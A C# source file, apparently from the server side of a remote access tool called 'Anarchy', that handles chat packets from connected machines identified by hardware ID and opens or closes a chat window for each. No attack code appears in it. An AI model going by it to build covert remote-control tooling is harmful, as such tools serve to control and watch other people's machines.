using System;
using System.Threading;
using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleChat
    {
        public void Read(MsgPack unpack_msgpack, Clients client)
        {
            try
            {
                FormChat formChat;
                formChat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (formChat != null)
                {
                    Console.Beep();
                    formChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                    formChat.richTextBox1.SelectionStart = formChat.richTextBox1.TextLength;
                    formChat.richTextBox1.ScrollToCaret();
                }
                else
                {
                    MsgPack msgPack;
                    msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "chatExit";
                    ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
                    client.Disconnected();
                }
            }
            catch
            {
            }
        }

        public void GetClient(MsgPack unpack_msgpack, Clients client)
        {
            FormChat formChat;
            formChat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (formChat != null && formChat.Client == null)
            {
                formChat.Client = client;
                formChat.textBox1.Enabled = true;
                formChat.timer1.Enabled = true;
            }
        }
    }
}
